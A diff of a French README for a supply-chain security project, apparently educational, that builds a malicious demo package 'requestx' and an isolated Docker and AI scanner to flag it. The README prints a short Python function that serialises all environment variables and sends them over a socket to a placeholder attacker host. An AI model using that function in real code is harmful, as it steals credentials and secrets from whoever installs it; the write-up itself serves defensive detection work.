@@ -1,4 +1,4 @@
-```markdown
+````markdown
 # Projet RequestX : Détection d’un Paquet Python Malveillant
 
 ## 1. Introduction
@@ -23,18 +23,17 @@ Derrière cette façade légitime, son fichier principal contient du code malvei
 - **Code malveillant :**
 
 ```python
-
 # Exfiltration de toutes les variables d'environnement
 def _exfiltrate_env():
     try:
         env_vars = json.dumps(dict(os.environ))
         s = socket.socket()
-        s.connect(("ip.hacker", port.hacker)) # Connexion au handle
+        s.connect(("ip.hacker", port.hacker))  # Connexion au serveur de l’attaquant
         s.send(env_vars.encode())
         s.close()
     except Exception:
         pass
-
+````
 
 Ainsi, un utilisateur qui installe et utilise ce paquet croit bénéficier d’une librairie pratique, mais son système est immédiatement compromis.
 
@@ -48,15 +47,17 @@ Son rôle est uniquement de démontrer que l’analyse fait correctement la dist
 
 ---
 
-### 4. Analyse des paquets
+## 4. Analyse des paquets
 
-L’analyse des paquets Python doit se fait dans un environnement **sécurisé et isolé** afin d’éviter toute exécution dangereuse de code malveillant. Pour cela, le processus complet est exécuté **dans un conteneur Docker dédié**, qui assure un confinement strict.
+L’analyse des paquets Python doit se faire dans un environnement **sécurisé et isolé** afin d’éviter toute exécution dangereuse de code malveillant.
+Pour cela, le processus complet est exécuté **dans un conteneur Docker dédié**, qui assure un confinement strict.
 
-De plus, l’étape d’interprétation du code est confiée à une **IA spécialisée** : celle-ci examine les fichiers Python, détecte des motifs suspects et rend un verdict accompagné de détails. L’approche combine donc **isolation technique** (Docker) et **intelligence artificielle** (analyse de code).
+De plus, l’étape d’interprétation du code est confiée à une **IA spécialisée** : celle-ci examine les fichiers Python, détecte des motifs suspects et rend un verdict accompagné de détails.
+L’approche combine donc **isolation technique** (Docker) et **intelligence artificielle** (analyse de code).
 
 ---
 
-#### Étapes de l’analyse :
+### Étapes de l’analyse :
 
 1. **Soumission du paquet** : un package Python est téléchargé dans le conteneur Docker.
 2. **Extraction du contenu** : le paquet est décompressé (fichiers `.py`, `pyproject.toml`, etc.).
@@ -66,39 +67,31 @@ De plus, l’étape d’interprétation du code est confiée à une **IA spécia
    * identifie des comportements dangereux (exfiltration, accès aux secrets, etc.),
    * distingue les fonctions légitimes des actions suspectes,
    * fournit un verdict explicite (`safe` / `malicious`).
-5. **Rapport JSON** : les résultats sont restitués de manière structurée pour chaque fichier python trouvé.
+5. **Rapport JSON** : les résultats sont restitués de manière structurée pour chaque fichier Python trouvé.
 
 ---
 
-#### Schéma ASCII du processus :
-
-
-
-
 ### Schéma ASCII du processus d’analyse
 
-```
+```ascii
 [ Paquet Python ] --> [ Docker isolé ] --> [ Extraction contenu ] --> [ Scan statique ] --> [ Analyse IA ] --> [ Rapport JSON ]
 ```
 
 ---
 
-#### Exemples de résultats
+### Exemples de résultats
 
 **Pour le paquet compromis `requestx` :**
 
 <img width="1116" height="578" alt="image" src="https://github.com/user-attachments/assets/bb13b828-b71e-466b-ad85-c875d15c11dc" />
 
-
-
 **Pour le paquet témoin `requestx_safe` :**
 
 <img width="1125" height="903" alt="image" src="https://github.com/user-attachments/assets/8946fcbd-ad13-4c3e-aa57-1101df03033d" />
 
-
 ---
 
-#### Interprétation
+### Interprétation
 
 * Dans le cas de **`requestx`**, l’IA détecte que le fichier accède aux variables d’environnement et les envoie vers un serveur externe → verdict **malicious**.
 * Dans le cas de **`requestx_safe`**, le code se limite à une fonction légitime et ne contient aucun comportement dangereux → verdict **safe**.
@@ -116,11 +109,8 @@ En complément, un autre risque fréquent est le **typosquatting** : un attaquan
 
 ---
 
-D’accord, je vois. Voici une version **plus brève et directe**, sans répétitions inutiles :
-
----
-
 ## 6. Conclusion
 
-Ce projet montre qu’un paquet Python peut facilement être détourné pour exécuter du code malveillant, et qu’une analyse automatisée dans un environnement isolé permet de détecter ces comportements avant installation. La comparaison entre **`requestx`** et **`requestx_safe`** illustre l’efficacité d’un tel outil pour renforcer la sécurité de la chaîne d’approvisionnement logicielle.
-````
+Ce projet met en évidence la facilité avec laquelle un paquet Python peut être compromis, et l’importance d’outils d’analyse automatisés et isolés pour renforcer la sécurité de la chaîne d’approvisionnement logicielle.
+
+```
